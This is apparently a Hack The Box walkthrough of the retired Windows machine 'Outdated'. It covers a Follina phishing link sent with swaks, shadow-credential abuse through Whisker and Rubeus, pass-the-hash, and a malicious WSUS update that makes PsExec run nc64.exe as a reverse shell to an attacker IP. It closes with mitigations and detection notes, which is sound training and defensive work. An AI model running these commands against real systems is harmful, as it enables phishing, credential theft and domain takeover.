---
machine: Outdated
os: Windows
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, follina, shadow-credentials, wsus]
---

# Outdated — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable note.
> Reference note based on public documentation and technical writeups. No real flags or credentials.

## TL;DR

An anonymous SMB share holds a PDF with the support address and environment hints. An email links to a **Follina (CVE-2022-30190)** payload; the client opens it in Word and `ms-msdt` executes code. The shell allows AD enumeration and abuse of **shadow credentials** against `sflowers`: a key is added to `msDS-KeyCredentialLink`, a TGT is requested with the certificate, and the hash is recovered for WinRM. Since `sflowers` is in `WSUS Administrators`, a malicious update is published with SharpWSUS and PsExec runs on the DC as SYSTEM.

## Recon

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
25/tcp    smtp       hMailServer
53/tcp    domain
88/tcp    kerberos-sec
135/tcp   msrpc
139/tcp   netbios-ssn
143/tcp   imap
389/tcp   ldap
445/tcp   microsoft-ds
464/tcp   kpasswd5
587/tcp   submission
593/tcp   http-rpc-epmap
636/tcp   ldapssl
2179/tcp  vmrdp
3268/tcp  globalcatLDAP
3269/tcp  globalcatLDAPssl
5985/tcp  wsman
8530/tcp  WSUS (HTTP)
8531/tcp  WSUS (HTTPS)
9389/tcp  adws
```

Domain `outdated.htb`, DC `dc.outdated.htb`, mail `mail.outdated.htb`. Ports 8530/8531 confirm WSUS.

## Enumeration

```bash
smbclient -L //<IP> -N
smbclient -N //<IP>/Shares
```

`Shares` is anonymously readable and contains `NOC_Reminder.pdf`. The document mentions the support mailbox and the update workflow. Users and groups are also enumerated over LDAP/SMB.

## Foothold

Generate an HTML file that invokes the `ms-msdt` protocol with an encoded command and serve it over HTTP. The payload must exceed 4096 bytes to bypass Word's user-activity check.

```bash
python3 follina.py --serve 80 --payload '<BASE64_COMMAND>'
```

Send the link to the support mailbox with `swaks`:

```bash
swaks --to itsupport@outdated.htb --from 'tester@outdated.htb' \
  --header 'Subject: Internal web app' --body 'http://<ATTACKER_IP>/msdt.html'
```

When the user opens the link, Word starts `msdt.exe` and runs the command. A shell arrives as `btables` on the client.

## Lateral movement

Collect BloodHound from the shell and identify that `btables` can write `msDS-KeyCredentialLink` on `sflowers` (shadow credentials). Add a public key to the object:

```powershell
.\Whisker.exe add /target:sflowers /domain:outdated.htb /dc:DC.outdated.htb
```

The output includes a certificate and a password. Request a TGT for `sflowers` with Rubeus:

```powershell
.\Rubeus.exe asktgt /user:sflowers /certificate:<BASE64_PFX> /password:<PASSWORD> /nowrap
```

The ticket allows authentication and recovery of the account's NTLM hash. Use `evil-winrm -H <NTLM_HASH>` for a session as `sflowers`.

## Privilege escalation

`sflowers` is a member of `WSUS Administrators`. The registry confirms the client uses `http://wsus.outdated.htb:8530`. Upload SharpWSUS and enumerate the server:

```powershell
.\SharpWSUS.exe locate
.\SharpWSUS.exe inspect
```

WSUS only distributes Microsoft-signed binaries, so use Sysinternals `PsExec.exe` as the signed payload. Create an update that runs PsExec with `nc64.exe` as SYSTEM:

```powershell
.\SharpWSUS.exe create /payload:'C:\ProgramData\PsExec.exe' \
  /args:'-accepteula -s -d C:\ProgramData\nc64.exe -e cmd.exe <ATTACKER_IP> 445' \
  /title:'CVE-2022-30190'
```

Approve the update for the DC and force a check-in. The DC downloads the binary, runs it as SYSTEM and returns a shell.

## Evidence

- Sent email and HTTP request for the Follina payload.
- `whoami` as `btables`, `sflowers` and `nt authority\system`.
- `SharpWSUS inspect` and the update ID, with no credentials.
- Capture of the incoming shell on the listener.

## Lessons learned

- Follina needs no macros: a link and `ms-msdt` are enough if the user opens the document.
- Shadow credentials moves laterally without knowing the password, using only write access to the attribute.
- WSUS is an internal supply chain: whoever approves updates can execute code on every client.
- An apparently minor AD permission plus a deployment service leads to Domain Admin.

## Mitigations and detection

- **Fix:** patch CVE-2022-30190; block `ms-msdt` from Office; enforce least privilege on `msDS-KeyCredentialLink`; separate `WSUS Administrators` from user accounts; sign and validate updates; restrict local publishing.
- **Detection:** `msdt.exe` spawned by Office with `/id PCWDiagnostic`; HTTP connections to external domains from Word; event 5136 modifying `msDS-KeyCredentialLink`; 4768 with a certificate; WSUS update creation and `PsExec` execution from `C:\ProgramData`.
- MITRE ATT&CK: T1204.002 (malicious file), T1556 (modify authentication process), T1550.002 (pass the hash), T1072 (software deployment tools).

## References

- <https://www.hackthebox.com/machines/Outdated>
- <https://0xdf.gitlab.io/2022/12/10/htb-outdated.html>
- <https://nvd.nist.gov/vuln/detail/CVE-2022-30190>
- <https://github.com/Th3M3/SharpWSUS>
